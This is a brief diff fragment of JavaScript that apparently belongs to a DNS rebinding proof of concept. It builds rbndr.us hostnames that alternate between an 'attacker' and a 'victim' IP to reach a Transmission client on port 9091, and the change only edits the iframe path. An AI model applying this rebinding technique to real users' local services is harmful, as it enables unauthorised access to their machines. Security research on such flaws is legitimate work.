@@ -38,7 +38,7 @@ function reloadFrame() {
 		+ convert_dotted_quad(attacker)
 		+ "."
 		+ convert_dotted_quad(victim)
-		+ ".rbndr.us:9091/transmission/iframe.html"
+		+ ".rbndr.us:9091/iframe.html"
 		+ "?rnd=" + Math.random();
 		var tmp = attacker;
 		attacker = victim;
